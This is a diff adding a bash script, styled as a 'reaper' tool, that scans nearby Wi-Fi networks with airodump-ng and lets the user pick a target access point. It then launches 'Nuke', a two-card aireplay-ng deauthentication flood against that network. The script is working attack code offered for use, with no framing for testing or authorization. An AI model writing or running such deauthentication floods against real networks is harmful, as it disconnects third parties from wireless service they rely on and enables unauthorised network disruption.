@@ -1,0 +1,41 @@
+#!/bin/bash
+
+tput setaf 1;tput bold;
+cat .reaper
+sleep 1
+tput setaf 2;
+src_mac0=`ifconfig wlan0 | awk '/HWaddr/ {print $5}'`
+src_mac01=`ifconfig wlan1 | awk '/HWaddr/ {print $5}'`
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+airodump-ng wlan0 -w tempdump
+trap ctrl_c INT
+clear
+echo -e "`tput setaf 3;`[-][-][-] Select Your Target or Type 'q' to Holster::`tput setaf 7;`\n"
+cat tempdump-01.csv | awk -F "," '{ print $1$4$14 }' | sed -n '/BSSID/!p' | sed -n '/Station/q;p' | sed '/^\s*$/d' | nl;echo ''
+read -e -p ">>> " -n3 tempmacid
+if [[ $tempmacid == 'q' ]]; then
+	rm tempdump*
+	exit
+else
+	mac_id=`cat tempdump-01.csv | awk -F "," '{ print $1$14 }' | sed -n '/BSSID/!p' | sed -n '/Station/q;p' | sed '/^\s*$/d' | awk 'NR=="'$tempmacid'"{ print $1 }'`
+#        mac_id=`echo ${tempmacid:0:2}:${tempmacid:2:2}:${tempmacid:4:2}:${tempmacid:6:2}:${tempmacid:8:2}:${tempmacid:10:2}`
+fi;
+echo -e ""
+rm tempdump*
+read -e -p "Enter Channel>>> " -n3 chnl; echo -e ''
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+iwconfig wlan0 channel $chnl
+echo -e "`tput setaf 2;`[!][!][!]Launching Nuke...[!][!][!]\n`tput setaf 7;`"
+ifconfig wlan1 down
+iwconfig wlan1 mode monitor
+ifconfig wlan1 up
+iwconfig wlan1 channel $chnl
+mate-terminal -x bash -c "aireplay-ng --deauth 2000 -a $mac_id -h $src_mac01 wlan1 --ignore-negative-one" &
+tput setaf 1;aireplay-ng --deauth 2000 -a $mac_id -h $src_mac0 wlan0 --ignore-negative-one;tput setaf 7;
+airmon-ng stop wlan0
+airmon-ng stop wlan1
+ifconfig wlan0 up
+ifconfig wlan1 up
